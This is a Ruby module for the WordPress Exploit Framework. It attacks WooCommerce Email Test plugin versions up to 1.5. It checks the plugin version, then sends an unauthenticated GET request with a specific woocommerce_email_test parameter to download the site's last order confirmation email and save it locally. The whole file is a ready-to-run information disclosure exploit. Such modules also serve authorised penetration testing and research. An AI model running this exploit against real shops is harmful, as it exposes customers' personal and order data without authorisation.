# frozen_string_literal: true

class Wpxf::Auxiliary::WoocommerceEmailTestOrderDisclosure < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'WooCommerce Email Test <= 1.5 Order Information Disclosure',
      desc: %(
        Versions <= 1.5 of the WooCommerce Email Test plugin allow unauthenticated
        users to download a copy of the last order confirmation e-mail sent by the system.
      ),
      author: [
        'jansass GmbH',                    # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8689']
      ],
      date: 'Dec 08 2016'
    )

    register_options([
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the HTML e-mail to',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('woocommerce-email-test', '1.6')
  end

  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  def run
    return false unless super

    emit_info 'Downloading order confirmation export...'
    res = download_file(
      url: full_uri,
      method: :get,
      params: {
        'woocommerce_email_test' => 'WC_Email_Customer_Completed_Order'
      },
      local_filename: export_path
    )

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success "Saved HTML e-mail to #{export_path}"
    true
  end
end
